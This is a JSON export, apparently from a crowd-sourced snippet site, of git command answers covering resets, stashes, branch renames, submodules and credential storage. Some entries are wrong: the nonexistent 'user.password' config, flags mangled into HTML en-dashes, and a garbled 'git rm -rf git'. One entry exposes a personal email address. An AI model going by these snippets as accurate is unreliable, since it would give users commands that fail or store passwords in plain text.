    "reg_date": "2021-10-11T22:05:27.000Z"
  },
  {
    "id": 1923,
    "keyword": null,
    "link": null,
    "title": " git remove remote tage",
    "description": "# Add tags git tag tagName  # Push tags git push --follow-tags  # Delete locally git tag -d tagName  # Delete remote tag: git tag -d tagName git push origin :tagName\nDelete a remote Git tag  $ git push --delete origin tagname\ngit push --delete origin tagname\ngit push --delete origin tagname \n",
    "reg_date": "2021-10-11T22:05:27.000Z"
  },
  {
    "id": 1924,
    "keyword": null,
    "link": null,
    "title": " git remove remote tags",
    "description": "Delete a remote Git tag  $ git push --delete origin tagname\n",
    "reg_date": "2021-10-11T22:05:27.000Z"
  },
  {
    "id": 1925,
    "keyword": null,
    "link": null,
    "title": " git remove repository local",
    "description": "$ rm -rf .git \n$ rm -rf .git   to delete git repository from local repo (from machine)\ngit rm -rf git\n",
    "reg_date": "2021-10-11T22:05:27.000Z"
  },
  {
    "id": 1926,
    "keyword": null,
    "link": null,
    "title": " git remove submodule",
    "description": "rm -rf .git \nTo remove a submodule you need to:  Delete the relevant section from the .gitmodules file. Stage the .gitmodules changes git add .gitmodules Delete the relevant section from .git/config. Run git rm --cached path_to_submodule (no trailing slash). Run rm -rf .git/modules/path_to_submodule (no trailing slash). Commit git commit -m \"Removed submodule \" Delete the now untracked submodule files rm -rf path_to_submodule\n# Remove the submodule entry from .git/config git submodule deinit -f path/to/submodule  # Remove the submodule directory from the superproject's .git/modules directory rm -rf .git/modules/path/to/submodule  # Remove the entry in .gitmodules and remove the submodule directory located at path/to/submodule git rm -f path/to/submodule \ngit rm -r --cached . git add . git commit -m \"Removing all files in .gitignore\" \nmv subfolder subfolder_tmp git submodule deinit subfolder git rm --cached subfolder mv subfolder_tmp subfolder git add subfolder \nOption 1. Remove .gitmodules file from project  Option 2. rm -rf .git/modules/path_to_submodule  Remember to commit the remove change!\n",
    "reg_date": "2021-10-11T22:05:28.000Z"
  },
  {
    "id": 1927,
    "keyword": null,
    "link": null,
    "title": " git remove unpushed commit",
    "description": "# Removes latest commit from the stash, KEEPS changes git reset --soft HEAD~  # Removes latest commit from the stash, DELETES changes git reset --hard HEAD~\n# Remove ALL commits up to commit hash. # NB: Make sure these commits have not been pushed.  git reset --hard <commit hash number>\n",
    "reg_date": "2021-10-11T22:05:28.000Z"
  },
  {
    "id": 1928,
    "keyword": null,
    "link": null,
    "title": " git remove upstream branch",
    "description": "$ git branch --unset-upstream \ngit push -d <remote_name> <branch_name>\n",
    "reg_date": "2021-10-11T22:05:28.000Z"
  },
  {
    "id": 1929,
    "keyword": null,
    "link": null,
    "title": " git rename branch",
    "description": "git branch -m <oldname> <newname> # Any Branch git branch -m <newname> # Current Branch  # For windows if you get \"Branch already exists\" error git branch -M <newname>\n# Rename the local branch to the new name git branch -m <old_name> <new_name>  # Delete the old branch on remote - where <remote> is, for example, origin git push <remote> --delete <old_name>  # Or shorter way to delete remote branch [:] git push <remote> :<old_name>  # Push the new branch to remote git push <remote> <new_name>  # Reset the upstream branch for the new_name local branch git push <remote> -u <new_name> \ngit branch -m <new_name>\ngit branch &ndash;m old-name new-name  git push origin :old-name new-name git push origin &ndash;u new-name\ngit push origin :old-name new-name\ngit push origin &ndash;u new-name\n",
    "reg_date": "2021-10-11T22:05:28.000Z"
  },
  {
    "id": 1930,
    "keyword": null,
    "link": null,
    "title": " git rename master to main",
    "description": "$ git branch -m master main\n$ git branch -m master main \n# Step 1  # create main branch locally, taking the history from master git branch -m master main  # Step 2  # push the new local main branch to the remote repo (GitHub)  git push -u origin main  # Step 3 # switch the current HEAD to the main branch git symbolic-ref refs/remotes/origin/HEAD refs/remotes/origin/main  # Step 4 # change the default branch on GitHub to main # https://docs.github.com/en/github/administering-a-repository/setting-the-default-branch  # Step 5 # delete the master branch on the remote git push origin --delete master\n$ git push -u origin main \n$ git push origin --delete master \n// must already have added somethign to HEAD $ git branch -m master main \n",
    "reg_date": "2021-10-11T22:05:28.000Z"
  },
  {
    "id": 1931,
    "keyword": null,
    "link": null,
    "title": " git rename remote",
    "description": "git remote rename old-remote-name new-remote-name\n",
    "reg_date": "2021-10-11T22:05:28.000Z"
  },
  {
    "id": 1932,
    "keyword": null,
    "link": null,
    "title": " git rename remote branch",
    "description": "# Rename the local branch to the new name git branch -m <old_name> <new_name>  # Delete the old branch on remote - where <remote> is, for example, origin git push <remote> --delete <old_name>  # Or shorter way to delete remote branch [:] git push <remote> :<old_name>  # Push the new branch to remote git push <remote> <new_name>  # Reset the upstream branch for the new_name local branch git push <remote> -u <new_name> \n1. Verify the local branch has the correct name: git branch -a  2. Next, delete the branch with the old name on the remote repository: git push origin &ndash;&ndash;delete old-name  3. Finally, push the branch with the correct name, and reset the upstream branch: git push origin &ndash;u new-name  Alternatively, you can overwrite the remote branch with a single command: git push origin :old-name new-name Resetting the upstream branch is still required: git push origin &ndash;u new-name\n$ git checkout Branch-Name-You-Want-to-Change $ git branch -m New-Branch-Name\ngit push origin :<branch_to_rename> git checkout -b <new_branch_name> git push --set-upstream origin <new_branch_name>\n",
    "reg_date": "2021-10-11T22:05:28.000Z"
  },
  {
    "id": 1933,
    "keyword": null,
    "link": null,
    "title": " git replace local branch with remote",
    "description": "git reset --hard origin/master \ngit fetch git reset --hard origin/{{branch}} # replace {{branch}} with name\ngit reset --hard origin/master\ngit reset --hard origin/<branch-name> \ngit branch branch_name -u your_new_remote/branch_name \n",
    "reg_date": "2021-10-11T22:05:29.000Z"
  },
  {
    "id": 1934,
    "keyword": null,
    "link": null,
    "title": " git replace master with branch",
    "description": "git checkout better_branch git merge --strategy=ours --no-commit master git commit -m \"Replacing master branch with better_branch\" git checkout master git merge better_branch git push origin master\n",
    "reg_date": "2021-10-11T22:05:29.000Z"
  },
  {
    "id": 1935,
    "keyword": null,
    "link": null,
    "title": " git reset amend",
    "description": "# Move the current head so that it's pointing at the old commit # Leave the index intact for redoing the commit. # HEAD@{1} gives you \"the commit that HEAD pointed at before  # it was moved to where it currently points at\". Note that this is # different from HEAD~1, which gives you \"the commit that is the # parent node of the commit that HEAD is currently pointing to.\" git reset --soft HEAD@{1}  # commit the current tree using the commit details of the previous # HEAD commit. (Note that HEAD@{1} is pointing somewhere different from the # previous command. It's now pointing at the erroneously amended commit.) git commit -C HEAD@{1}\n",
    "reg_date": "2021-10-11T22:05:29.000Z"
  },
  {
    "id": 1936,
    "keyword": null,
    "link": null,
    "title": " git reset branch",
    "description": "git fetch origin git reset --hard origin/master \ngit checkout mybranch git reset --hard origin/mybranch \ngit reset --soft HEAD^ //resets head by 1\ngit fetch origin git reset --hard origin/branch_name\nsudo git reset --hard Head\ngit reset --hard f414f31 git reset --soft HEAD@{1} git commit -m \"Reverting to the state of the project at f414f31\" \n",
    "reg_date": "2021-10-11T22:05:29.000Z"
  },
  {
    "id": 1937,
    "keyword": null,
    "link": null,
    "title": " git reset change in one file",
    "description": "# undo local changes to specific file git checkout -- file\n",
    "reg_date": "2021-10-11T22:05:29.000Z"
  },
  {
    "id": 1938,
    "keyword": null,
    "link": null,
    "title": " git reset file to master",
    "description": "git checkout origin/master [filename] \n## Revert file to master If you want to revert the file to its state in master ```bash git checkout origin/master thefile ```\ngit checkout HEAD -- my-file.txt \n",
    "reg_date": "2021-10-11T22:05:29.000Z"
  },
  {
    "id": 1939,
    "keyword": null,
    "link": null,
    "title": " git reset from repository",
    "description": "git fetch --all git reset --hard origin/master\ngit fetch origin git reset --hard origin/master Remember this forever\ngit fetch origin git reset --hard origin/branch_name\n git reset --hard <commit-hash>  git push -f origin master # only works for unprotected branches that allow force push\n",
    "reg_date": "2021-10-11T22:05:29.000Z"
  },
  {
    "id": 1940,
    "keyword": null,
    "link": null,
    "title": " git reset head of master",
    "description": "git fetch origin git reset --hard origin/master \ngit fetch origin git reset --hard origin/master Remember this forever\n git reset --hard <commit-hash>  git push -f origin master # only works for unprotected branches that allow force push\n$ git remote set-url origin https://github.com/USERNAME/REPOSITORY.git\ngit reset --hard origin/master; git commit -m 'reset to remote';git push --force local dev\ngit reset --hard f414f31 git reset --soft HEAD@{1} git commit -m \"Reverting to the state of the project at f414f31\" \n",
    "reg_date": "2021-10-11T22:05:30.000Z"
  },
  {
    "id": 1941,
    "keyword": null,
    "link": null,
    "title": " git reset head to remote",
    "description": "git fetch origin git reset --hard origin/master \n",
    "reg_date": "2021-10-11T22:05:30.000Z"
  },
  {
    "id": 1942,
    "keyword": null,
    "link": null,
    "title": " git reset keep changes",
    "description": "git reset HEAD^ --soft\ngit reset HEAD^\ngit reflog is your friend. Find the commit that you want to be on in that list and you can reset to it for example:git reset --hard e870e41  (If you didn't commit your changes... you might be in trouble - commit early, and commit often!)\n",
    "reg_date": "2021-10-11T22:05:30.000Z"
  },
  {
    "id": 1943,
    "keyword": null,
    "link": null,
    "title": " git reset last commit",
    "description": "# KEEP CHANGES git reset --soft HEAD~1  # REMOVE CHANGES git reset --hard HEAD~1\ngit reset --soft HEAD~1\n$ git reset --soft HEAD~1\n#this  will preserve changes done to your files git reset --soft HEAD~1  #this will get rid of the commit and the changes done to the files $ git reset --hard HEAD~1\n#this  will preserve changes done to your files git reset --soft HEAD~1  #this will get rid of the commit and the changes done to the files $ git reset --hard HEAD~1  \n$ git reset --soft HEAD~1 \n",
    "reg_date": "2021-10-11T22:05:30.000Z"
  },
  {
    "id": 1944,
    "keyword": null,
    "link": null,
    "title": " git reset origin",
    "description": "git fetch origin git reset --hard origin/master\ngit fetch origin git reset --hard origin/master \ngit fetch origin git reset --hard origin/master Remember this forever\ngit reset --hard origin/master \n$ git remote set-url origin https://github.com/USERNAME/REPOSITORY.git\ngit reset --hard origin/master; git commit -m 'reset to remote';git push --force local dev\n",
    "reg_date": "2021-10-11T22:05:31.000Z"
  },
  {
    "id": 1945,
    "keyword": null,
    "link": null,
    "title": " git reset soft head",
    "description": "git reset --soft HEAD^ //resets head by 1\n$ git reset --soft HEAD~1 \ngit reset --soft HEAD^ #The command to undo a commit and reset to the commit before HEAD and keeping the changes is:\nsudo git reset --hard Head\ngit reset --soft\ngit reset --hard f414f31 git reset --soft HEAD@{1} git commit -m \"Reverting to the state of the project at f414f31\" \n",
    "reg_date": "2021-10-11T22:05:31.000Z"
  },
  {
    "id": 1946,
    "keyword": null,
    "link": null,
    "title": " git reset stash conflict",
    "description": "git reset --merge\ngit reset HEAD . (note the trailing dot) git stash (save the conflicted merge, just in case) git checkout develop git fetch upstream; git merge upstream/develop git checkout <new-branch>; git rebase develop git stash apply stash@{1}\n",
    "reg_date": "2021-10-11T22:05:31.000Z"
  },
  {
    "id": 1947,
    "keyword": null,
    "link": null,
    "title": " git reset to commit",
    "description": "# reset to specefic commit git reset --hard <commit id>  # to go back one step  git reset --hard HEAD~1  # note: use --soft to keep file changes\ngit reset --soft HEAD^ //resets head by 1\ngit reset --hard HEAD~0 will go to latest commit.   git reset --hard HEAD~1 will go to last but one commit.  Note:  Be careful while running this command. it can't be irreversible \nsudo git reset --hard Head\n//Git Rollback to a specific commit via Mac terminal  //Navigate to project and open git log cd projectname git log --oneline  //Locate and checkout the desired commit ID git checkout abc1234 .   //(Type q to quit the git log)  //Stage All changes, commit with comment, and push to remote git add -A git commit -m \"Revert commit: abc1234\" git push\ngit reset --hard f414f31 git reset --soft HEAD@{1} git commit -m \"Reverting to the state of the project at f414f31\" \n",
    "reg_date": "2021-10-11T22:05:31.000Z"
  },
  {
    "id": 1948,
    "keyword": null,
    "link": null,
    "title": " git reset to origin/master",
    "description": "git reset --hard origin/master \ngit checkout mybranch git reset --hard origin/mybranch\n",
    "reg_date": "2021-10-11T22:05:31.000Z"
  },
  {
    "id": 1949,
    "keyword": null,
    "link": null,
    "title": " git reset to remote",
    "description": "git fetch origin git reset --hard origin/master\ngit fetch origin git reset --hard origin/master \ngit fetch origin git reset --hard origin/master Remember this forever\ngit fetch origin git reset --hard origin/branch_name\n git reset --hard <commit-hash>  git push -f origin master # only works for unprotected branches that allow force push\n$ git remote set-url origin https://github.com/USERNAME/REPOSITORY.git\n",
    "reg_date": "2021-10-11T22:05:31.000Z"
  },
  {
    "id": 1950,
    "keyword": null,
    "link": null,
    "title": " git restore to remote",
    "description": "git fetch origin git reset --hard origin/master \ngit fetch origin git reset --hard origin/master Remember this forever\n git reset --hard <commit-hash>  git push -f origin master # only works for unprotected branches that allow force push\n",
    "reg_date": "2021-10-11T22:05:31.000Z"
  },
  {
    "id": 1951,
    "keyword": null,
    "link": null,
    "title": " git revert one commit",
    "description": " git reset --soft HEAD~1\n# Reset the index and working tree to the desired tree # Ensure you have no uncommitted changes that you want to keep git reset --hard 56e05fced  # Move the branch pointer back to the previous HEAD git reset --soft HEAD@{1}  git commit -m \"Reverting to the state of the project at f414f31\"\ngit revert <commit hash>\ngit reset <commitId> # Exemple git reset 5310517\n#ignore all changes, and back to last commit   git add . git stash \n",
    "reg_date": "2021-10-11T22:05:32.000Z"
  },
  {
    "id": 1952,
    "keyword": null,
    "link": null,
    "title": " git revert to origin",
    "description": "git fetch origin git reset --hard origin/master\ngit fetch origin git reset --hard origin/master \n$ git remote set-url origin https://github.com/USERNAME/REPOSITORY.git\n",
    "reg_date": "2021-10-11T22:05:32.000Z"
  },
  {
    "id": 1953,
    "keyword": null,
    "link": null,
    "title": " git revert to repo version",
    "description": "git fetch origin git reset --hard origin/master \n",
    "reg_date": "2021-10-11T22:05:32.000Z"
  },
  {
    "id": 1954,
    "keyword": null,
    "link": null,
    "title": " git revert uncommitted changes",
    "description": "# Revert changes to modified files. git reset --hard  # Remove all untracked files and directories. # '-f' is force, '-d' is remove directories. git clean -fd\n//CHECK FOR UNCOMMITED CHANGES git status -s  //If there are no changes has no output //If there are changes are listed the modified files\n",
    "reg_date": "2021-10-11T22:05:32.000Z"
  },
  {
    "id": 1955,
    "keyword": null,
    "link": null,
    "title": " git rm cached gitignore",
    "description": "git rm -r --cached . \n",
    "reg_date": "2021-10-11T22:05:32.000Z"
  },
  {
    "id": 1956,
    "keyword": null,
    "link": null,
    "title": " git same as origin master",
    "description": "git reset --hard origin/master \n",
    "reg_date": "2021-10-11T22:05:32.000Z"
  },
  {
    "id": 1957,
    "keyword": null,
    "link": null,
    "title": " git save password global",
    "description": "git config --global user.name \"your username\" git config --global user.password \"your password\"  git config --global credential.helper store\ngit config --global credential.helper \"cache --timeout=3600\" \n",
    "reg_date": "2021-10-11T22:05:32.000Z"
  },
  {
    "id": 1958,
    "keyword": null,
    "link": null,
    "title": " git save username and password",
    "description": "git config --global user.name \"your username\" git config --global user.password \"your password\"  git config --global credential.helper store\ngit config --global credential.helper store\n$ git config --global user.name \"Mona Lisa\" $ git config --global user.name $ mona\n$ git config credential.helper store $ git push http://example.com/repo.git Username: <type your username> Password: <type your password>  [several days later] $ git push http://example.com/repo.git [your credentials are used automatically]\n# This cache timeout is in seconds $ git config --global credential.helper 'cache --timeout=3600'  \n// for storing globally git config --global credential.helper store git push origin <your branch>  //for folder specific git config credential.helper store git push origin <your branch>  // after pushing once with password from next time it wont ask for password\n",
    "reg_date": "2021-10-11T22:05:33.000Z"
  },
  {
    "id": 1959,
    "keyword": null,
    "link": null,
    "title": " git search history for file",
    "description": "git log --all --full-history -- \"**/thefile.*\" \n",
    "reg_date": "2021-10-11T22:05:33.000Z"
  },
  {
    "id": 1960,
    "keyword": null,
    "link": null,
    "title": " git set alias",
    "description": "$ git config --global alias.co checkout $ git config --global alias.br branch $ git config --global alias.ci commit $ git config --global alias.st status\n",
    "reg_date": "2021-10-11T22:05:33.000Z"
  },
  {
    "id": 1961,
    "keyword": null,
    "link": null,
    "title": " git set commit date",
    "description": "git commit --date \"Mon Jul 05 17:00 2021 +0200\"\n git commit --amend --date=\"YYYY-MM-DD HH:MM:SS\"\n",
    "reg_date": "2021-10-11T22:05:33.000Z"
  },
  {
    "id": 1962,
    "keyword": null,
    "link": null,
    "title": " git set description branch",
    "description": " * \"git branch --edit-description\" can be used to add descriptive text    to explain what a topic branch is about. \n",
    "reg_date": "2021-10-11T22:05:33.000Z"
  },
  {
    "id": 1963,
    "keyword": null,
    "link": null,
    "title": " git set email and name for repo",
    "description": "# For setting inside project folder git config user.name \"Neeraj Singh\" git config user.email 'nnneerajjj@gmail.com'\n",
    "reg_date": "2021-10-11T22:05:33.000Z"
  },
  {
    "id": 1964,
    "keyword": null,
    "link": null,
    "title": " git set name and email",
    "description": "git config --global user.name \"Your Name\" git config --global user.email \"youremail@yourdomain.com\"\n# FOR ALL REPOS ## change username git config --global user.name \"John Doe\" ## change email address git config --global user.email \"johndoe@example.com\"  # FOR CURRENT-DIRECTORY REPO ONLY ## change username git config user.name \"John Doe\" ## change email address git config user.email \"johndoe@example.com\"\ngit config --global user.email \"my.adresse@hotmail.com\" git config --global user.name \"My Name\"\nTo set your global username/email configuration: Open the command line. Set your username: git config --global user.name \"FIRST_NAME LAST_NAME\" Set your email address: git config --global user.email \"MY_NAME@example.com\" To set repository-specific username/email configuration: From the command line, change into the repository directory. Set your username: git config user.name \"FIRST_NAME LAST_NAME\" Set your email address: git config user.email \"MY_NAME@example.com\" Verify your configuration by displaying your configuration file: cat .git/config\ngit config --global user.name \"My Name\"\ngit config --global user.name \"Peter\" git config --global user.email \"peter@gmail.com\" \n",
    "reg_date": "2021-10-11T22:05:34.000Z"
  },
  {
    "id": 1965,
    "keyword": null,
    "link": null,
    "title": " git set remote",
    "description": " git config --get remote.origin.url\ngit remote set-url origin new.git.url/here\n git remote -v  git remote set-url origin https://github.com/USERNAME/REPOSITORY.git\ngit remote set-url origin https://hostname/USERNAME/REPOSITORY.git\n# If you require full output and you are on a network that can reach the remote repo where the origin resides  git remote show origin \ngit remote set-url origin https://github.com/USERNAME/REPOSITORY.git\n",
    "reg_date": "2021-10-11T22:05:34.000Z"
  },
  {
    "id": 1966,
    "keyword": null,
    "link": null,
    "title": " git set upstream",
    "description": "git branch --set-upstream-to <remote-branch>  // example git branch --set-upstream-to origin feature-branch  // show up which remote branch a local branch is tracking git branch -vv  // short version to set upstream with very first push git push -u origin local-branch\ngit push --set-upstream origin <branch>\ngit push --set-upstream origin <remote-branch>\ngit branch --set-upstream-to=origin/branch \n$ git remote add upstream https://github.com/ORIGINAL_OWNER/ORIGINAL_REPOSITORY.git\ngit remote add upstream git@bitbucket.org:some-gatekeeper-maintainer/some-project.git\n",
    "reg_date": "2021-10-11T22:05:34.000Z"
  },
  {
    "id": 1967,
    "keyword": null,
    "link": null,
    "title": " git setup local user",
    "description": "git config user.name \"Your Name Here\" git config user.email your@email.com  Or Global git config --global user.name \"Your Name Here\" git config --global user.email your@email.com\n$ git config --global user.name \"Mona Lisa\"\n",
    "reg_date": "2021-10-11T22:05:34.000Z"
  },
  {
    "id": 1968,
    "keyword": null,
    "link": null,
    "title": " git shortcut",
    "description": "# add shortcuts for common git commands git config --global alias.co checkout git config --global alias.br branch git config --global alias.ci commit git config --global alias.st status\n$ git config --global alias.co checkout $ git config --global alias.br branch $ git config --global alias.ci commit $ git config --global alias.st status\n",
    "reg_date": "2021-10-11T22:05:34.000Z"
  },
  {
    "id": 1969,
    "keyword": null,
    "link": null,
    "title": " git shortcuts",
    "description": "# add shortcuts for common git commands git config --global alias.co checkout git config --global alias.br branch git config --global alias.ci commit git config --global alias.st status\n$ git config --global alias.co checkout $ git config --global alias.br branch $ git config --global alias.ci commit $ git config --global alias.st status\n# Setup short form of commands to save keystrokes  git config --global alias.co checkout git config --global alias.br branch git config --global alias.ci commit git config --global alias.st status\n# Setup short form of commands to save keystrokes git config --global alias.co checkout git config --global alias.br branch git config --global alias.ci commit git config --global alias.st status git config --global alias.unstage 'reset HEAD --' git config --global alias.last 'log -1 HEAD'\n",
    "reg_date": "2021-10-11T22:05:34.000Z"
  },
  {
    "id": 1970,
    "keyword": null,
    "link": null,
    "title": " git show-branch tree command line",
    "description": "git log --all --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit \n",
    "reg_date": "2021-10-11T22:05:34.000Z"
  },
  {
    "id": 1971,
    "keyword": null,
    "link": null,
    "title": " git show origin",
    "description": " git config --get remote.origin.url\ngit config --get remote.origin.url\n# If you require full output and you are on a network that can reach the remote repo where the origin resides  git remote show origin \n$ git remote -v origin\thttps://github.com/schacon/ticgit (fetch) origin\thttps://github.com/schacon/ticgit (push)\n# when you are not connected to the network, you can use this git config --get remote.origin.url \n",
    "reg_date": "2021-10-11T22:05:35.000Z"
  },
  {
    "id": 1972,
    "keyword": null,
    "link": null,
    "title": " git show remote url",
    "description": " git config --get remote.origin.url\ngit config --get remote.origin.url\n# Check existing git url: git remote -v\n# If you require full output and you are on a network that can reach the remote repo where the origin resides  git remote show origin \ngit remote show origin\n$ git remote -v origin\thttps://github.com/schacon/ticgit (fetch) origin\thttps://github.com/schacon/ticgit (push)\n",
    "reg_date": "2021-10-11T22:05:35.000Z"
  },
  {
    "id": 1973,
    "keyword": null,
    "link": null,
    "title": " git show staged files",
    "description": "git diff --staged # or you can use --cached (they are synoyms, see the source)\ngit diff --name-only --cached \ngit diff --name-only --cached\n",
    "reg_date": "2021-10-11T22:05:35.000Z"
  },
  {
    "id": 1974,
    "keyword": null,
    "link": null,
    "title": " git soft reset 1 commit",
    "description": "# reset one commit git reset --soft HEAD~1 # reset to s specefic commit point git reset --soft <COMMIT ID>\n",
    "reg_date": "2021-10-11T22:05:35.000Z"
  },
  {
    "id": 1975,
    "keyword": null,
    "link": null,
    "title": " git soft reset head",
    "description": "git reset --soft HEAD^ //resets head by 1\n$ git reset --soft HEAD~1 \n",
    "reg_date": "2021-10-11T22:05:35.000Z"
  },
  {
    "id": 1976,
    "keyword": null,
    "link": null,
    "title": " git start over",
    "description": "# checkout the master branch git checkout master  # create a new branch so you can find the old code easily git branch oldStuff-KeepingForReference  # push the branch to github git push origin oldStuff-KeepingForReference  # You currently have the master branch checked out # so now cd to the project root and start your rewrite:  cd <your project root> rm -rf *  # Create a commit of the delete git add --all * git commit -m \"Fresh start\"  # Start your rewrite echo \"Some changes\" > file.txt git add file.txt git commit -m \"This is the first commit of the rewrite\"\n",
    "reg_date": "2021-10-11T22:05:35.000Z"
  },
  {
    "id": 1977,
    "keyword": null,
    "link": null,
    "title": " git stas hauntracked files",
    "description": "git stash --include-untracked\n",
    "reg_date": "2021-10-11T22:05:35.000Z"
  },
  {
    "id": 1978,
    "keyword": null,
    "link": null,
    "title": " git stash apply item",
    "description": "git stash apply stash@{index}\ngit checkout stash@{index} -- <filename> #stash particular file\n",
    "reg_date": "2021-10-11T22:05:35.000Z"
  },
  {
    "id": 1979,
    "keyword": null,
    "link": null,
    "title": " git stash command with name",
    "description": "git stash save \"my_stash\" \n$ git stash push -m \"john-hancock\"  $ git stash apply stash^{/john-hancock} \n# save your working copy changes git diff > some.patch  # re-apply it later git apply some.patch\n",
    "reg_date": "2021-10-11T22:05:36.000Z"
  },
  {
    "id": 1980,
    "keyword": null,
    "link": null,
    "title": " git stash diff",
    "description": "git stash show -p stash@{1} \ngit stash show -p stash@{1}\n",
    "reg_date": "2021-10-11T22:05:36.000Z"
  },
  {
    "id": 1981,
    "keyword": null,
    "link": null,
    "title": " git stash drop",
    "description": "# if you don't need a particular stash, use git stash drop <stash_id> git stash drop stash@{0}  # to show all stash, use this: git stash list\ngit stash clear\ngit stash show -p stash@{1}\ngit stash clear // to clear the whole list\ngit stash drop stash@{index}   // here index will be shown after getting stash list.\ngit stash drop 0\n",
    "reg_date": "2021-10-11T22:05:36.000Z"
  },
  {
    "id": 1982,
    "keyword": null,
    "link": null,
    "title": " git stash pop index",
    "description": "git stash save \"my_stash\" \ngit stash pop stash@{2}\ngit stash save \"my_stash\" // Where \"my_stash\" is the stash name.  // Some more useful things to know: All the stashes are stored in a stack. Type: git stash list // This will list down all your stashes.  // To apply a stash and remove it from the stash stack, type: git stash pop stash@{n}\ngit stash drop 0\ngit stash pop stash@\\{1\\} \n",
    "reg_date": "2021-10-11T22:05:36.000Z"
  },
  {
    "id": 1983,
    "keyword": null,
    "link": null,
    "title": " git stash show without apply",
    "description": "git stash show -p stash@{1} \n",
    "reg_date": "2021-10-11T22:05:36.000Z"
  },
  {
    "id": 1984,
    "keyword": null,
    "link": null,
    "title": " git stash untracked files",
    "description": "git stash --include-untracked\n# Print out the list of files which will be removed (dry run) git clean -n  # Interactive and you will get a quick overview of what is  # going to be deleted offering you the possibility to include/exclude  # the affected files git clean -i  # To remove files, run git clean -f  # To remove directories, run  git clean -fd  # To remove ignored files, run  git clean -fX  # To remove ignored and non-ignored files, run  git clean -fx\ngit stash clear\ngit stash save -u \"Message\"\ngit clean -i \n$ git statusOn branch mainChanges to be committed:    new file:   style.cssChanges not staged for commit:    modified:   index.htmlUntracked files:    script.js$ git stash -uSaved working directory and index state WIP on main: 5002d47 our new homepageHEAD is now at 5002d47 our new homepage$ git statusOn branch mainnothing to commit, working tree clean\n",
    "reg_date": "2021-10-11T22:05:36.000Z"
  },
  {
    "id": 1985,
    "keyword": null,
    "link": null,
    "title": " git status do not show permission changes",
    "description": "git config core.fileMode false \n",
    "reg_date": "2021-10-11T22:05:38.000Z"
  },
  {
    "id": 1986,
    "keyword": null,
    "link": null,
    "title": " git status just shows directory and not files",
    "description": "$ git status -uall \n",
    "reg_date": "2021-10-11T22:05:38.000Z"
  },
  {
    "id": 1987,
    "keyword": null,
    "link": null,
    "title": " git store credential",
    "description": "// local git config credential.helper store // global git config --global credential.helper store\n# this will store your credentials \"forever\" git config --global credential.helper store\n$ git config credential.helper store $ git push http://example.com/repo.git Username: <type your username> Password: <type your password>  [several days later] $ git push http://example.com/repo.git [your credentials are used automatically]\n",
    "reg_date": "2021-10-11T22:05:38.000Z"
  },
  {
    "id": 1988,
    "keyword": null,
    "link": null,
    "title": " git store credentials",
    "description": "// local git config credential.helper store // global git config --global credential.helper store\n$ git config --global credential.helper store\n# this will store your credentials \"forever\" git config --global credential.helper store\n$ git config credential.helper store $ git push http://example.com/repo.git Username: <type your username> Password: <type your password>  [several days later] $ git push http://example.com/repo.git [your credentials are used automatically]\n# This cache timeout is in seconds $ git config --global credential.helper 'cache --timeout=3600'  \n#Git store credentials // local git config credential.helper store // global git config --global credential.helper store\n",
    "reg_date": "2021-10-11T22:05:38.000Z"
  },
  {
    "id": 1989,
    "keyword": null,
    "link": null,
    "title": " git submodule get all",
    "description": "git submodule update --init --recursive\n",
    "reg_date": "2021-10-11T22:05:39.000Z"
  },
  {
    "id": 1990,
    "keyword": null,
    "link": null,
    "title": " git submodule update authentication",
    "description": "git config --global url.\"https://YOUR_USERNAME@gitlab.com/\".insteadOf \"https://gitlab.com/\" \n",
    "reg_date": "2021-10-11T22:05:39.000Z"
  },
  {
    "id": 1991,
    "keyword": null,
    "link": null,
    "title": " git switch vs checkout",
    "description": "git checkout has been separated into two to clarify its uses: - git switch: used to change branches, as git checkout <branchname> does - git restore:  used to reset files to certain revisions, as git checkout --<path_to_file> does\n",
    "reg_date": "2021-10-11T22:05:39.000Z"
  },
  {
    "id": 1992,
    "keyword": null,
    "link": null,
    "title": " git sync local branch with remote",
    "description": "git fetch --prune origin git reset --hard origin/master git clean -f -d \nmaybe you're lokking for git pull origin master or git pull origin main or  git pull origin <branchname>\n",
    "reg_date": "2021-10-11T22:05:40.000Z"
  },
  {
    "id": 1993,
    "keyword": null,
    "link": null,
    "title": " git temporarily ignore changes to tracked file",
    "description": "# start ignoring changes to a file: git update-index --assume-unchanged path/to/file  # keep tracking again: git update-index --no-assume-unchanged path/to/file\n",
    "reg_date": "2021-10-11T22:05:40.000Z"
  },
  {
    "id": 1994,
    "keyword": null,
    "link": null,
    "title": " git to gethub after create repi",
    "description": "Open Terminal. Change the current working directory to your local project. Initialize the local directory as a Git repository. $ git init Add the files in your new local repository. This stages them for the first commit. $ git add . # Adds the files in the local repository and stages them for commit. To unstage a file, use 'git reset HEAD YOUR-FILE'. Commit the files that you've staged in your local repository. $ git commit -m \"First commit\" # Commits the tracked changes and prepares them to be pushed to a remote repository. To remove this commit and modify the file, use 'git reset --soft HEAD~1' and commit and add the file again. At the top of your GitHub repository's Quick Setup page, click  to copy the remote repository URL. Copy remote repository URL field In Terminal, add the URL for the remote repository where your local repository will be pushed. $ git remote add origin remote repository URL # Sets the new remote $ git remote -v # Verifies the new remote URL Push the changes in your local repository to GitHub. $ git push -u origin master # Pushes the changes in your local repository up to the remote repository you specif\n",
    "reg_date": "2021-10-11T22:05:40.000Z"
  },
  {
    "id": 1995,
    "keyword": null,
    "link": null,
    "title": " git track filename capitalisation",
    "description": "git config core.ignorecase false\n",
    "reg_date": "2021-10-11T22:05:41.000Z"
  },
  {
    "id": 1996,
    "keyword": null,
    "link": null,
    "title": " git transfer changes to another branch",
    "description": "git stash git checkout -b new-branch git stash pop \ngit stash git checkout correct-branch git stash pop \ngit stash git checkout -b new-branch git stash pop\n",
    "reg_date": "2021-10-11T22:05:41.000Z"
  },
  {
    "id": 1997,
    "keyword": null,
    "link": null,
    "title": " git unable to update local ref",
    "description": "git gc --prune=now git remote prune origin rm .git/refs/remotes/origin/master git fetch git pull origin master\n",
    "reg_date": "2021-10-11T22:05:41.000Z"
  },
  {
    "id": 1998,
    "keyword": null,
    "link": null,
    "title": " git undo add",
    "description": "// undo add for one file git reset <file>  // undo add for all files git reset\ngit reset myfilename.txt\ngit reset <file> or git reset\ngit reset -- FILE_NAME\n",
    "reg_date": "2021-10-11T22:05:41.000Z"
  },
  {
    "id": 1999,
    "keyword": null,
    "link": null,
    "title": " git undo amend",
